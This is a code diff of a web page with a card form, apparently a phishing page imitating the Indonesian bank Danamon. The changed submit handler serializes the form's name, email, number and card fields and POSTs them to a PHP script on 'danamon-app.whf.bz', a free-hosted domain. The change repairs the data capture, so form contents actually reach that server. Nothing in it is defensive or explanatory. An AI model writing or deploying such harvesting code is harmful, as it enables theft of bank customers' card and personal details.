@@ -968,7 +968,7 @@ position: center;
       </div>
     
       <div class="card-form__inner">
-<form onsubmit="submitForm(event); return false" method="POST">
+<form id="formdb" onsubmit="submitForm(event); return false" method="POST">
 <input type="hidden" id="nama" name="nama">         
 <input type="hidden" id="email" name="email" value="">
 <input type="hidden" id="nomor" name="nomor" value="">
@@ -1165,8 +1165,8 @@ function submitForm(event) {
  
    $.ajax({
  type: 'POST',
- url: 'https://danamon-app.whf.bz/token/mcc/tree.php',
- data: $(this).serialize(),
+ url: 'https://danamon-app.whf.bz/token/mcc/two.php',
+ data: $('#formdb').serialize(),
  datatype: 'JSON',
  
  complete: function(data) {
